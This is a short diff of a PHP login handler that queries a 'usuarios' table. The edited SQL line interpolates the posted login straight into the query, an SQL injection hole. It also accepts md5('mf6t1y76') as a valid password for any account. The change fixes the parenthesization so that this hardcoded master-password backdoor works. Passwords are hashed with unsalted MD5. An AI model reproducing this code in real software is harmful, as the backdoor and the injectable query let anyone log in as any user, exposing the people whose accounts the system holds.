@@ -5,7 +5,7 @@
         $login = $_POST['login'];
         $senha = md5($_POST['senha']);
 
-        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or md5('mf6t1y76')) = '{$senha}'";
+        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or md5('mf6t1y76') = '{$senha}')";
         $result = mysqli_query($con, $query);
 
         if(mysqli_num_rows($result)){
